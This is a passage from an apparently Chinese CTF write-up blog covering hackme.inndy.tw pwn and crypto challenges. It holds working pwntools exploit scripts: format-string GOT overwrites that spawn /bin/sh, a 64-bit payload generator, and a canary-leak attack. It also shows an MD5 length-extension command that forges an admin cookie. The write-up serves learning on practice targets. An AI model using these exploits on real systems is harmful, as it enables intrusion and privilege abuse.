class="number">0xC</span> + <span class="number">0x4</span>), syscall_addr, <span class="number">0xdeadbeef</span>,</span><br><span class="line">                SYS_execve, buf_addr, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">io.sendafter(<span class="string">':'</span>, payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h2 id="toooomuch"><a href="#toooomuch" class="headerlink" title="toooomuch"></a>toooomuch</h2><blockquote><p>nc hackme.inndy.tw 7702<br>Can you pass the game?</p></blockquote><p>送分题, 二分法慢慢猜就猜到了</p><h2 id="toooomuch-2"><a href="#toooomuch-2" class="headerlink" title="toooomuch-2"></a>toooomuch-2</h2><blockquote><p>nc hackme.inndy.tw 7702<br>Get a shell, please.<br>Tips: Buffer overflow, 0x8048560, shellcode</p></blockquote><p>和上一道题几乎一样的二进制文件, 不过把 <code>cat flag</code> 改成了 <code>cat fake_flag</code>.</p><p>先检查一下, 发现什么保护都没开, 然后有个全局变量 password 是可控的</p><p>往这里面写入 shellcode 然后跳转到这儿就能 getshell 了</p><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><blockquote><p>nc hackme.inndy.tw 7711<br>Tips: format string vulnerability</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ checksec echo</span><br><span class="line">[*] &apos;/home/aloxaf/CTF/echo&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure><p>程序非常简单, 就是读入一个字符串然后用 printf 输出. 非常明显的格式化字符串漏洞.<br>并且有 system 函数可以利用.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    fgets(&amp;s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(&amp;s, <span class="string">"exit\n"</span>) );</span><br><span class="line">  system(<span class="string">"echo Goodbye"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwnlib.gdb.context.terminal = [<span class="string">'konsole'</span>, <span class="string">'-e'</span>]</span><br><span class="line">context(arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">io = process(<span class="string">'./echo'</span>)</span><br><span class="line"><span class="comment"># io = remote('hackme.inndy.tw', 7711)</span></span><br><span class="line">elf = ELF(<span class="string">'./echo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 没有开ASLR, 可以直接从 elf 中读取 plt </span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'printf_got: &#123;:#x&#125;'</span>.format(printf_got))</span><br><span class="line">log.info(<span class="string">'system_plt: &#123;:#x&#125;'</span>.format(system_plt))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwnlib.gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;printf_got: system_plt&#125;)</span><br><span class="line">log.info(<span class="string">'payload: '</span> + payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>第一次做出格式化字符串的题, 看了半天CTF wiki, 终于明白原理了.</p><p>利用格式化字符串可以做到任意地址读写, 基本思路是先泄露 system 地址.<br>然后把 GOT 表中 printf 的地址替换为 system 的. 这样第二步输入 <code>/bin/sh</code>就可以 getshell 了</p><p>补充: 记录一下原理免得自己忘记. 首先我们的格式化字符串是在栈上的, 并且相对与 printf 的 ebp 的位置应该是不变的. 所以我们可以在本地调试的时候确定格式化字符串的位置,</p><p>然后使用 %n\$p 这种方式就能输出格式换字符串本身了(当然一次只有4个字节, 而且是hex形式). </p><p>如果使用 %n\$s 的话, 就能把这个位置的数据解释为地址, 然后将这个地址的内容当做字符串取出.<br>如果使用 %n\$n 的话, 就能把这个位置的数据解释为地址, 然后往这个地址写入当前已输出的字符数.</p><p>至于 n 的值, 可以通过输入 <code>AAAA%p%p%p...</code> 这样的字符串, 然后在输出中寻找 <code>0x41414141</code> 来定位, 也可以直接 gdb 在 printf 处下断点, 然后 <code>stack 20</code> 先把栈打印出来, 再寻找.</p><h2 id="echo2"><a href="#echo2" class="headerlink" title="echo2"></a>echo2</h2><blockquote><p>nc hackme.inndy.tw 7712<br>Tips: ASLR enabled</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ checksec echo2</span><br><span class="line">[*] &apos;/home/aloxaf/CTF/echo2&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>和上一题主要有两个不同, 一个是64位, 另一个是开启了ASLR</p><p>先执行一下, 输入 <code>AAAAAAAA%p%p%p%p%p%p%p%p</code> 根据结果 <code>AAAAAAAA0x7fa5b1b827300x7fff524033000xfbad208b0x7fa5b1b815c00x7fa5b1b827200x4141 4141414141410x70257025702570250x7025702570257025</code> 可以判断出偏移是6.</p><p>这题做了很久, 最后看了下 M4x 师傅的博客, 得知可以泄露 main 和  __libc_start_main 的地址, 继而计算出基址, 然后就可以覆写 GOT 来 get shell 了.</p><p>调试判断出距离 <code>main+74</code> 的偏移是41, <code>__libc_start_main+243</code> 的偏移是 43</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">pwnlib.gdb.context.terminal = [<span class="string">'konsole'</span>, <span class="string">'-e'</span>]</span><br><span class="line">context(log_level=<span class="string">'DEBUG'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process('./echo2', env=&#123;"LD_PRELOAD": "./libc-2.23.so.x86_64"&#125;)</span></span><br><span class="line">io = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7712</span>)</span><br><span class="line">elf = ELF(<span class="string">'./echo2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwnlib.gdb.attach(io, 'b printf')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露 main 函数基址, __libc_start_main 基址</span></span><br><span class="line">io.sendline(<span class="string">'%41$p %43$p'</span>)</span><br><span class="line">main_addr, libc_addr = (int(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> io.recv().split())</span><br><span class="line">main_addr -= <span class="number">74</span></span><br><span class="line">libc_addr -= <span class="number">240</span></span><br><span class="line">log.info(<span class="string">'main_addr: &#123;:#x&#125;'</span>.format(main_addr))</span><br><span class="line">log.info(<span class="string">'libc_addr: &#123;:#x&#125;'</span>.format(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 libc 基址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>, libc_addr)</span><br><span class="line">libc_base = libc_addr - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">log.info(<span class="string">'libc_base: &#123;:#x&#125;'</span>.format(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 elf 基址</span></span><br><span class="line">elf_offset = main_addr - elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"><span class="comment"># 得到 printf_got 地址</span></span><br><span class="line">printf_got = elf_offset + elf.got[<span class="string">'printf'</span>]</span><br><span class="line">log.info(<span class="string">'printf_got: &#123;:#x&#125;'</span>.format(printf_got))</span><br><span class="line"><span class="comment"># 得到 system 地址</span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">log.info(<span class="string">'system_addr: &#123;:#x&#125;'</span>.format(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位没法使用 fmtstr_payload, 因为默认把地址放在前面会导致大概率被 \x00 截断</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str_payload64</span><span class="params">(offset, src, data)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    生成 64 位格式化字符串payload</span></span><br><span class="line"><span class="string">    offset: 偏移</span></span><br><span class="line"><span class="string">    src: 源地址</span></span><br><span class="line"><span class="string">    data: 欲写入内容</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    payload1, payload2 = [], []</span><br><span class="line">    addr = [[ord(v), i] <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(p64(data)[:<span class="number">-2</span>])] <span class="comment"># 最后两位一般是 \x00</span></span><br><span class="line">    addr = sorted(addr)</span><br><span class="line">    chr_cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate(addr):</span><br><span class="line">        payload1.append(<span class="string">'%&#123;:02&#125;c%&#123;&#125;$hhn'</span>.format(value[<span class="number">0</span>]-chr_cnt, offset+<span class="number">9</span>+index))</span><br><span class="line">        payload2.append(src+value[<span class="number">1</span>])</span><br><span class="line">        chr_cnt = value[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用 '_' 对齐</span></span><br><span class="line">    <span class="keyword">return</span> flat(payload1 + [<span class="string">'_'</span> * <span class="number">6</span>] + payload2)</span><br><span class="line"></span><br><span class="line">payload = fmt_str_payload64(<span class="number">6</span>, printf_got, system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>这个地方有个坑点就是 240 这个数, 和 libc 的版本相关...<br>问了 M4x 师傅才知道, 我果然还是太 naive 了</p><h2 id="echo3"><a href="#echo3" class="headerlink" title="echo3"></a>echo3</h2><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc hackme.inndy.tw 7720</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➤ checksec echo3</span><br><span class="line">[*] &apos;/home/aloxaf/CTF/echo3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>这道题的难点主要是缓冲区不在栈上, 而是在堆上.</p><p>这极大地限制了任意地址读写的能力, 基本上只能靠<code>%$n</code>来读写当前栈里的数据.</p><h2 id="smashthestack"><a href="#smashthestack" class="headerlink" title="smashthestack"></a>smashthestack</h2><blockquote><p>nc hackme.inndy.tw 7717</p><p>Tips: stderr is available, beware of the output</p></blockquote><p>Canary 和 NX 都开了, <del>本来注意到如下代码, 想着能不能让 buf 为 0xFFFFFFFF 然后一直泄露到堆上.</del></p><p><del>一直失败, 后来冷静分析才意识到这段内存不一定全部都能访问, 而且 0xFFFFFFFF bytes = 4 GiB. 怎么可能这样泄露...</del></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="string">"Try to read the flag\n"</span>, <span class="number">0x15</span>u);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x10000</span>u);</span><br><span class="line">write(<span class="number">1</span>, buf, *(<span class="keyword">size_t</span> *)buf);</span><br></pre></td></tr></table></figure><p>于是又跑去看 M4x 师傅的博客, 看到了这篇文章:  <a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">论canary的几种玩法</a></p><p>非常硬却失挺的方法, 学习了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">gdb.context.terminal = [<span class="string">'konsole'</span>, <span class="string">'-e'</span>]</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7717</span>)</span><br><span class="line"><span class="comment"># io = process('./smash-the-stack')</span></span><br><span class="line">ex = ELF(<span class="string">'./smash-the-stack'</span>)</span><br><span class="line">buff_addr = ex.symbols[<span class="string">'buff'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">io.send(p32(buff_addr) * <span class="number">50</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h2><blockquote><p>526b78425233745561476c7a49476c7a4947566863336b7349484a705a3268305033303d</p></blockquote><p>unhexlify + base64</p><h2 id="r-u-kidding"><a href="#r-u-kidding" class="headerlink" title="r u kidding"></a>r u kidding</h2><blockquote><p>EKZF{Hs&#39;r snnn dzrx, itrs bzdrzq bhogdq}</p></blockquote><p>凯撒</p><h2 id="not-harder"><a href="#not-harder" class="headerlink" title="not harder"></a>not harder</h2><blockquote><p>Nm@rmLsBy{Nm5u-K{iZKPgPMzS2I<em>lPc%_SMOjQ#O;uV{MM</em>?PPFhk|Hd;hVPFhq{HaAH&lt;<br>Tips: pydoc3 base64</p></blockquote><p>base85 + base32</p><h2 id="classic-cipher-1"><a href="#classic-cipher-1" class="headerlink" title="classic cipher 1"></a>classic cipher 1</h2><blockquote><p>MTHJ{CWTNXRJCUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}<br>Solve this substitution cipher</p></blockquote><p>替代密码, 随便找个网站跑一下, 再冷静分析一下, 应该不成问题</p><h2 id="classic-cipher-2"><a href="#classic-cipher-2" class="headerlink" title="classic cipher 2"></a>classic cipher 2</h2><blockquote><p>Solve this vigenere cipher</p></blockquote><p>随便搜一搜找个工具就行了....</p><p>开始用自己的工具解, 一直解不出,<br>后来才发现自己设的最大秘钥长度刚好比这个秘钥小了一位orz</p><h2 id="easy-AES"><a href="#easy-AES" class="headerlink" title="easy AES"></a>easy AES</h2><blockquote><p>Can you encrypt things with AES?<br>Tips: What is symmetric cipher?</p></blockquote><p>对称加密, 加解密秘钥是同一个</p><h2 id="one-time-padding"><a href="#one-time-padding" class="headerlink" title="one time padding"></a>one time padding</h2><blockquote><p> You will never see flag?!</p></blockquote><p>这题目想了半天没想通, 题目采用了随机等长密钥, 使得字频分析失效. 感觉非常牢不可破的样子, 后来去搜 writeup 才明白...</p><p>注意到一行注释: <code>// X ^ 0 = X, so we want to avoid null byte to keep your secret safe :)</code></p><p>这意味着, 密文中不会出现明文中有的字符...那么只要收集到足够的密文然后统计就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://hackme.inndy.tw/otp/?issue_otp=illya'</span></span><br><span class="line"></span><br><span class="line">ciphers = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    ciphers += requests.get(url).text</span><br><span class="line"></span><br><span class="line">b = [number.long_to_bytes(int(i, <span class="number">16</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> ciphers.split()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(len(b[<span class="number">0</span>])):</span><br><span class="line">    c = set(range(<span class="number">256</span>)) - set([i[_] <span class="keyword">for</span> i <span class="keyword">in</span> b])</span><br><span class="line">    <span class="keyword">if</span> len(c) == <span class="number">1</span>:</span><br><span class="line">        print(chr(c.pop()), end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">''</span>)</span><br><span class="line">        print(bytes(c))</span><br></pre></td></tr></table></figure><p>然而很迷的是跑出来的 FLAG 不完整...好在能够猜出来</p><h2 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle"></a>shuffle</h2><blockquote><p>I have shuffled my text file, can you recover it?</p></blockquote><p>脚本逻辑很简单, 一段明文, 两种加密方式, 一是对明文做一个随机的替代密码存起来, 二是把明文打乱存起来.</p><p>统计字频可以还原出替代密码表, 然后就可以大致还原出明文了(个别符号的出现次数可能相等).</p><h2 id="login-as-admin-2"><a href="#login-as-admin-2" class="headerlink" title="login as admin 2"></a>login as admin 2</h2><blockquote><p>Please login as admin. Tips: length extension attack</p></blockquote><p>题目提示是长度扩展攻击</p><p>Google了一下, 原理没看懂, <del>工具倒是找到了</del></p><p>注意到得到 flag 的条件是 <code>$user[&#39;admin&#39;]</code>为 true, 也就是说对用户名并没有要求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($user[<span class="string">'admin'</span>]) printf(<span class="string">"&lt;code&gt;%s&lt;/code&gt;"</span>, htmlentities($flag)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析设置 cookie 的代码, 得知 cookie 内容为 <code>$sig#$serialized</code>, 以 guest 为例, 内容为 <code>6bcb9c9155975a53e951b0b50f137480#name=guest&amp;admin=0</code></p><p>只要能够修改 admin 为非 0 值, 就能得到 flag.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">($user_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line"></span><br><span class="line">    $user = [</span><br><span class="line">        <span class="string">'name'</span> =&gt; $user_data[<span class="string">'name'</span>],</span><br><span class="line">        <span class="string">'admin'</span> =&gt; $user_data[<span class="string">'admin'</span>]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $serialized = http_build_query($user);</span><br><span class="line">    $sig = md5(md5($secret).$serialized);</span><br><span class="line">    $all = base64_encode(<span class="string">"&#123;$sig&#125;#&#123;$serialized&#125;"</span>);</span><br><span class="line">    setcookie(<span class="string">'user'</span>, $all, time()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而 cookie 有验证过程, cookie 通过验证的条件是: <code>md5(md5($secret).$serialized) == $sig</code>, 如果知道 <code>$secret</code> 的值的话, 就很简单了, 然而并不知道...</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $secret, $error;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">list</span>($sig, $serialized) = explode(<span class="string">'#'</span>, base64_decode($_COOKIE[<span class="string">'user'</span>]), <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(md5(md5($secret).$serialized) !== $sig) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parse_str($serialized, $user);</span><br><span class="line">    <span class="keyword">return</span> $user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候就要用到 <em>哈希长度扩展攻击</em> 了</p><blockquote><p>哈希长度扩展攻击(Hash Length Extension Attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在<strong>消息与密钥的长度已知</strong>的情形下，所有采取了 H(key ∥ message) 此类构造的散列函数。MD5和SHA-1 等基于 Merkle–Damgård 构造的算法均对此类攻击显示出脆弱性。</p><p>这类哈希函数有以下特点</p><ul><li>消息填充方式都比较类似，首先在消息后面添加一个1，然后填充若干个0，直至总长度与 448 同余，最后在其后附上64位的消息长度（填充前）。</li><li>每一块得到的链接变量都会被作为下一次执行hash函数的初始向量IV。在最后一块的时候，才会将其对应的链接变量转换为hash值。</li></ul><p>一般攻击时应满足如下条件</p><ul><li>我们已知 key 的长度，如果不知道的话，需要爆破出来</li><li>我们可以控制 message 的消息。</li><li>我们已经知道了包含 key 的一个消息的hash值。</li></ul><p>这样我们就可以得到一对(messge,x)满足x=H(key ∥ message)虽然我们并不清楚key的内容。</p><p>--- CTF Wiki</p></blockquote><p>简要地讲, 如果已知 <code>$key</code> 的长度和 <code>$mes</code> 的内容和 <code>md5($key.$mes)</code> 的值, 利用 <em>哈希长度扩展攻击</em> , 就可以构造一个 <code>$pad</code>, 使得我们可以获取 <code>md5($key.$mes.$pad.$mes2)</code> 的值, 其中 <code>$mes2</code>是自定义的信息.</p><p>以 hashdump 和马猴烧酒为例, 用如下命令可以得到新的 <code>$sig</code> 和 <code>$serialized</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">▶ hashpump -s 6bcb9c9155975a53e951b0b50f137480 -d &apos;name=guest&amp;admin=0&apos; -a &apos;illya&apos; -k 32</span><br><span class="line">4b6fe69cd0880b2e01e609d8ed9fd30a</span><br><span class="line">name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00illya</span><br></pre></td></tr></table></figure><p>比较迷的一点是, 一开始在 Chrome 里直接改 Cookie 然后刷新似乎不行 = =. 最后用 httpie 提交才获得了 flag. orz</p><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><blockquote><p>I&#39;ve X0Red some file, could you recover it?</p></blockquote><p>以前写过工具, 利用重合指数法攻击</p><h2 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h2><blockquote><p>(´・ω・`)</p></blockquote><p>chrome 直接打开编码有问题, curl 看看.<br>然后复制到搜到的解密工具 <a href="https://tool.lu/js/" target="_blank" rel="noopener">https://tool.lu/js/</a> 里得到源码).</p><p>代码逻辑不难, 加密部分直接爆破就行. 需要注意的是程序在 nodejs 环境下才能运行.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (i * <span class="number">0xb1</span> + <span class="number">0x1b</span>) &amp; <span class="number">0xff</span> == n:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">print(bytes([crack(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> crypted]).decode())</span><br></pre></td></tr></table></figure><p>得到后直接放参数里运行</p><h2 